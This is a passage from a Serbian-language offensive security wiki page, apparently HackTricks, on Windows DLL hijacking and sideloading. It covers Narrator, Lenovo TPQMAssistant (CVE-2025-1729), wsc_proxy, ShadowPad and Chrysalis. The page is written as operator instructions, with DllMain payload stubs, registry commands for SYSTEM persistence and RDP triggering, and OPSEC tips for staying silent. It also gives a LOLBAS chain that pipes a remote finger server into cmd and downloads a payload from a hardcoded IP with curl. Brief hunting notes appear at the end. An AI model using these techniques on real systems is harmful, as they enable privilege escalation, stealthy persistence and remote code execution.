- Probe path (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako writable attacker-controlled DLL postoji na OneCore putanji, ona se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Nisu potrebni nikakvi exports.

Discovery pomoću Procmon-a
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivni hijack će proizvesti zvuk/istaknuti UI. Da biste ostali nečujni, pri attach-u enumerišite Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte je pomoću `SuspendThread`; nastavite izvršavanje u sopstvenoj niti. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Trigger i persistence putem Accessibility konfiguracije
- User kontekst (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa navedenim podešavanjima, pokretanje Narrator-a učitava planted DLL. Na secure desktop-u (logon screen), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvolite classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se na host putem RDP-a, a na logon screen-u pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP session zatvori — izvršite inject/migrate bez odlaganja.

Bring Your Own Accessibility (BYOA)
- Možete klonirati registry entry ugrađenog Accessibility Tool-a (AT), na primer CursorIndicator, izmeniti ga tako da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na naziv tog AT-a. Na ovaj način se proizvoljno izvršavanje prosleđuje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Celokupna payload logika može biti smeštena u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, nalazi se u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se svakodnevno pokreće u 9:30 ujutru u kontekstu prijavljenog korisnika.
- **Directory Permissions**: `CREATOR OWNER` ima dozvolu za upis, što lokalnim korisnicima omogućava da ubace proizvoljne fajlove.
- **DLL Search Behavior**: Najpre pokušava da učita `hostfxr.dll` iz svog working directory-ja i beleži "NAME NOT FOUND" ako fajl nedostaje, što ukazuje na prioritet lokalnog directory search-a.

### Implementacija exploita

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti directory i iskoristiti nedostajući DLL za postizanje code execution-a u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 pod kontekstom trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, malicious DLL se pokreće u administratorovoj sesiji sa medium integrity.
4. Kombinujte standardne UAC bypass tehnike da biste prešli sa medium integrity na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading putem potpisanog Host-a (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading tehnikom kako bi izvršili payload unutar trusted, signed procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se nečujno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, signed EXE i malicious DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working directory-ja i izvršava attacker kod unutar signed parent procesa (ATT&CK T1574.001).

MSI analiza (šta tražiti)
- CustomAction tabela:
- Potražite unose koji pokreću izvršne datoteke ili VBScript. Sumnjiv obrazac: LaunchApplication koji u pozadini izvršava embedded file.
- U Orca (Microsoft Orca.exe) pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Embedded/split payloads u MSI CAB-u:
- Administrativno raspakivanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koje VBScript CustomAction spaja i dešifruje. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktični sideloading sa wsc_proxy.exe
- Postavite ova dva fajla u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: napadačev DLL. Ako nisu potrebni specifični exporti, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exporte originalnoj biblioteci, dok payload pokrećete u okviru DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za export zahteve koristite proxying framework (npr. DLLirant/Spartacus) za generisanje forwarding DLL-a koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binary-ja. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može biti neuspešan.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binary-ja i skupa exporta.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **tri-file triad** kako bi se uklopio u legitimni software, uz zadržavanje core payload-a u šifrovanom obliku na disku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – zloupotrebljavaju se vendor-i kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju executable tako da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje važeći.
2. **Malicious loader DLL** – postavlja se pored EXE-a pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskiran pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe encrypted blob, dešifruje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a dešifrovanog payload-a, loader briše TMP file kako bi uništio forensic evidence.

Tradecraft napomene:

* Preimenovanje signed EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava mu da se predstavi kao Windows binary, a da zadrži vendor signature, zato reprodukujte naviku Ink Dragon-a da postavlja binary-je koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting kontrola zahteva samo da se vaš malicious DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; signed parent obično može da se pokrene bez izmena.
* ShadowPad decryptor očekuje da se TMP blob nalazi pored loader-a i da je writable kako bi mogao da isprazni file nakon mapiranja. Ostavite direktorijum writable dok se payload ne učita; nakon učitavanja u memory, TMP file se može bezbedno obrisati radi OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-a:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima commands sa Finger server-a i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava response server-a, omogućavajući operatorima da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmite archive sa benign extension-om, raspakujte ga i staged sideload target plus DLL postavite pod random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI-ja kako bi telemetry prikazao CIM-created process dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funkcioniše sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) izvršava se pod trusted name-om.

- **Hunting:** Postavite alert za `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; ova kombinacija je neuobičajena van admin scripts-a.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni intrusion grupe Lotus Blossom zloupotrebio je trusted update chain za isporuku NSIS-packed dropper-a koji je postavio DLL sideload plus potpuno in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga dešifruje pomoću custom LCG-based stream-a (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa temp podatke i skače na njega.
- Da bi se izbegao IAT, loader razrešava API-je hashiranjem export names-a pomoću **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi rezultate sa salted target hashes.

Main shellcode (Chrysalis)
- Dešifruje PE-like main module ponavljanjem add/XOR/sub operacija sa key-em `gQ2JR&9;` kroz pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` kako bi završio import resolution.
- Rekonstruiše DLL name strings u runtime-u pomoću per-character bit-rotate/XOR transforms, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku export table u blokovima od 4 byte-a pomoću Murmur-style mixing-a i koristi `GetProcAddress` samo kao fallback ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` file-a na **offset 0x30808** (size **0x980**) i RC4-dešifruje se pomoću key-a `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacons formiraju dot-delimited host profile, dodaju tag `4Q` na početak, a zatim ga RC4-šifruju key-em `vAuig34%^325hGV` pre `HttpSendRequestA` poziva preko HTTPS-a. Responses se RC4-dešifruju i prosleđuju pomoću tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode se određuje CLI args-ima: bez args-a = install persistence (service/Run key) koji pokazuje na `-i`; `-i` ponovo pokreće self sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Isti intrusion je postavio Tiny C Compiler i izvršio `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je dostavio attacker sadržao je embedded shellcode, koji je kompajliran i pokrenut in-memory bez upisivanja PE-a na disk. Reprodukujte pomoću:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova faza compile-and-run zasnovana na TCC-u u runtime-u je importovala `Wininet.dll` i preuzimala second-stage shellcode sa hardkodovanog URL-a, obezbeđujući fleksibilan loader koji se predstavlja kao pokretanje compiler-a.

## Signed-host sideloading with export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da čisto učita kasnije stage-ove, umesto da se sruši nakon učitavanja malicioznog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postaviti trusted EXE pored malicioznog DLL-a koristeći očekivano ime dependency-ja, kao što je `version.dll`.
- Maliciozni DLL **proxy-uje svaki očekivani export** nazad ka pravom system DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da import resolution i dalje uspeva, a host process nastavlja da radi.
- Nakon učitavanja, maliciozni DLL **patch-uje entry point host-a** tako da main thread ulazi u beskonačnu `Sleep` petlju umesto da se završi ili izvršava code paths koji bi terminirali process.
- Novi thread obavlja stvarni maliciozni rad: decrypt-uje ime ili putanju DLL-a sledeće faze (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeni DLL proxying čuva API compatibility, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije stage-ove.
- Parkiranje main thread-a u `Sleep(INFINITE)` predstavlja jednostavan način da signed process ostane rezidentan dok loader obavlja decryption, staging ili network bootstrap u worker thread-u.
- Hunting samo na osnovu sumnjivog `DllMain` može da propusti ovaj obrazac ako se zanimljivo ponašanje odvija nakon patch-ovanja entry point-a host-a i pokretanja sekundarnog thread-a.

Minimalni workflow
1. Kopirati signed host EXE i utvrditi DLL koji učitava iz local directory-ja.
2. Napraviti proxy DLL koji export-uje iste funkcije i forward-uje ih ka legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirati worker thread.
4. Iz tog thread-a patch-ovati entry point host-a ili start routine main thread-a tako da se vrti u petlji na `Sleep`.
5. Decrypt-ovati ime/config sledećeg stage DLL-a i pozvati `LoadLibrary` ili izvršiti manual-map payload-a.

Defensive pivots
- Signed processes koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog application directory-ja umesto iz `System32`.
- Memory patches na process entry point-u ubrzo nakon image load-a, naročito jump/call instrukcije redirect-ovane na `Sleep`/`SleepEx`.
- Thread-ovi koje kreira proxy DLL i koji odmah pozivaju `LoadLibrary` nad drugim DLL-om sa decrypt-ovanim imenom.
- Full-export proxy DLL-ovi postavljeni pored vendor executable fajlova unutar writable staging directory-ja kao što su `ProgramData`, `%TEMP%` ili putanje do unpacked archive fajlova.

## References

- [1] [Red Canary – Intelligence Insights: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Jednostavan C primer.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
